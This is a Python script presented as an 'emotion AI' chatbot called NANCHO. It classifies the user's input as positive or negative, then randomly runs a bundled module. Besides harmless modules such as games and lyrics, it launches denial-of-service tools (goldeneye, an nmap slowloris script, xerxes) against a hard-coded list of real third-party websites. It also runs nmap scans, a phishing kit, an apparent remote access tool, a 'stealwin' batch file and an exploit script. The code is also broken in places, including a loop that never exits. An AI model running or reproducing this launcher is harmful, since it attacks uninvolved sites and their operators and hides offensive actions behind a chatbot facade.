#importing
import sa, nltk, re, random, os

#Printing banner
banner = """
                    .`                                                                              
                    .                                 `                                             
                    `                        `-`      +.                                            
                                             o -:.    s-                                            
                                             s.    +``d                                             
                                             `s-   :+y+.`.`                                         
                    .                         `/o- ...   `:-         --                             
                    -o:                         `:/...----..       `:-`    -::--`                   
                     -hh:                         `               .-` `-- `//```                    
                      .hNy.                     ``           .-.  `     `:`                         
                       `yNd:                   ``           :.       .-` .:                         
                        `sNm+                 `        `   :`  `--:/:+:..--                         
                         `sNm/              `.       --   .:.--./.::``````    NANCHO V1.1           
                          `sNm:            `.      .+-     ````:`                                   
                           `hNd.          `.     ./o.        .-`                                    
                            .mNh`        `.    `:yo`         .                                      
                             +NN+       .-    -yd+`                   ````````                      
                             `hNd.    `.-   `omd/               ``...````                           
                         ``   :NN+.  `+:   -shy:  .    .    `-::/-`                                 
              -    -.-:+++/.  `dNo+- `o- `+sdh.   --  `/`.-:+.``:+                                  
             `+:.-+yyNNNmodos- +Nsh+-+/:.ymsy`    `+.-/o+/-.+.  .+                                  
             .ossyhoo:-.//+hyd+.Ndh.++/+dMN+/-../``++so:+-  -:::/:                                  
          .:+oo/-:/.+  `o` .hyh/hMh//.oomm/ `----/yho-` ``    ```                                   
       `-::-.`+.  ./o. -+   .myhyMNy`/mmm:   `-sdds-`                                               
    `.--.`    -:   ./. ``    +MMNMMs/NMm:  `:ymms-                                                  
   ```                       `mMMMMdNMN/`::ymmy-                          NAnCHO  AI BY SaJa        
                `     `-   `-/oMMMMMMNo./ohmy-                                                      
                -`    :+   ``o:MMMMMMh`+mys/`                                                       
                ./`  `+-     o-NMMMMN:yNNy/                                                         
                 -:` :/      +.mMMMMddMNo:/                                                         
        ````````  :/-+`     `o.mNMMNNMN+`.+.--                ``                                    
      `.-:/+osyyyssyy+-..``.-//yhMMdmN/ ``..``          `.----.`                                    
           ``.-/+syddmNNmdyo:.smMMMMN+             `.-///-.`                                        
                    `.:+shmNMNNNMMMMh          `-+oo+:.`                                            
                          .:odMMMMMM:      `.+yhy+-`                                                
                             -ydMMMm    `.odmh+-                    Does what this wants            
                             .osMMMm` .+hNdo-                      Just tell this a story           
                              ++MMMMosNms-                                                          
                              :/MMMMMd+`                                                            
                               +MMMM/`                                                              
                               -MMMd`                                                               
                               .MMN`                                                                
                               .MMh                                                                 
                               .Mo`                                                                 
                                --                                                                  
"""
review_features = []

#get all individual words in a list of reviews --------------------------------
def get_words_in_reviews(all_reviews):
  all_words = []
  for (words, sentiment) in all_reviews:
    all_words.extend(words)
  return all_words

#get word features in a list of words -----------------------------------------
def get_word_features(list_of_words):
  list_of_words = nltk.FreqDist(list_of_words)
  word_features = list_of_words.keys()
  return word_features

#extract features -------------------------------------------------------------
def extract_features(document):
  document_words = set(document)
  features = {}
  for word in review_features:
    features['contains(%s)' % word] = (word in document_words)
  return features

#removes punctuation that's paired with a word in a list ----------------------
def remove_punctuation(list_of_words):
  rm_punct = []
  for w in list_of_words:
    rm_punct.append(re.sub('([a-z]+)[?:!.,;]*',r'\1',w))
  return rm_punct

def initialize():
  #open example positive and negative reviews ---------------------------------
  pos_reviews_file = open('positive_reviews.txt', 'r')
  neg_reviews_file = open('negative_reviews.txt', 'r')

  #store positive reviews into a list -----------------------------------------
  pos_reviews = []
  for each_review in pos_reviews_file:
    each_review = ' '.join(each_review.split())
    if each_review.endswith('\n'):
      each_review = each_review[:-1]
    if not each_review == '':
      pos_reviews.append([each_review,"kkkk"])

  #store negative reviews into a list -----------------------------------------
  neg_reviews = []
  for each_review in neg_reviews_file:
    each_review = ' '.join(each_review.split())
    if each_review.endswith('\n'):
      each_review = each_review[:-1]
    if not each_review == '':
      neg_reviews.append([each_review,"mmmm"])

  #remove words whose length is < 3 and combine both lists --------------------
  all_reviews = []
  for (review, sentiment) in pos_reviews + neg_reviews:
    reviews_filtered = [w.lower() for w in review.split() if len(w) >= 3]
    all_reviews.append((reviews_filtered, sentiment))

  #get feature set-------------------------------------------------------------
  global review_features
  review_features = get_word_features(get_words_in_reviews(all_reviews))
  review_features = remove_punctuation(review_features)

  #get training set -----------------------------------------------------------
  training_set = nltk.classify.apply_features(extract_features, all_reviews)
  #print training_set
  #get classifier
  classifier = nltk.NaiveBayesClassifier.train(training_set)
  return classifier

#classifier:classify
classifier = initialize()
print(banner)
inpuat = input('emotionai$ ')
#unless input is exit, classify and open
while input != 'exit':
	if classifier.classify(extract_features(inpuat.split())) == "kkkk" :
 		arrayI = [6, 2, 4, 5, 11, 12, 13, 14]
 		subject = random.choice(arrayI)
 	
	if classifier.classify(extract_features(inpuat.split())) == "mmmm" :
 		arrayII = [1, 3, 7, 8, 9, 10, 15, 17, 18]
 		subject = random.choice(arrayII)

 		arrayweb = ["shinmok.sen.ms.kr", "google.com", "samsung.com", "sajamart.blogger.com", "sajahacking.blogspot.com", "mokapt3.apti.co.kr"]
 		webs = random.choice(arrayweb)
 
 		arrayweba = ["https://shinmok.sen.ms.kr", "https://google.com", "https://samsung.com", "https://sajamart.blogger.com", "https://sajahacking.blogspot.com", "https://mokapt3.apti.co.kr"]
 		websa = random.choice(arrayweba)
 

	#workin'
	if subject == 6 :
 	   exec(open("chatbot.py").read())
    	#trigger dos attack itself
	if subject == 18 :
 	   os.system("python goldeneye.py "+websa+" -w 5000 -d")
	#workin'
	if subject == 8 :
 	   exec(open("prime.py").read())
    	
	#workin'
	if subject == 1 :
 	   exec(open("exploit.py").read())

	#workin'
	if subject == 2 :
 	   ip = input("while using Ipfy, what ip will you track?")
 	   os.system("python ipfy.py -t " + ip) 
    
	if subject == 12 :
 	   url = input("your url to wget~@")
 	   os.system("wget  " + url) 

	#workin'
	if subject == 3 :
	    exec(open("sa.py").read())

	#workin'
	if subject ==  7:
	    exec(open("game.py").read())
    
	    #workin'
	if subject == 9 :
	    exec(open("lyrics.py").read())
    
	#workin'
	if subject == 10 :
	    exec(open("saju.py").read())
    
	#workin'
	if subject == 11 :
	    os.system("python2 Arat.py")
    
	#workin'
	if subject == 4 :
	    os.system("bash zphisher.sh")
	
	#workin'
	if subject == 5 :
	    print('type chomd +x xerxes && ./xerxes in terminal')
	
	#workin'
	if subject == 13 :
	    exec(open("srp.py").read())    
	#workin'
	if subject == 14 :
	    exec(open("math.py").read())    
		#workin'
	if subject == 15 :
	    os.system("start stealwin/@.bat")
	#workin'
	if subject == 16 :
	    os.system("nmap -A -T4" + webs)

	#workin'
	if subject == 17 :
	    os.system("nmap --script http-slowloris --max-parallelism 400 " + webs)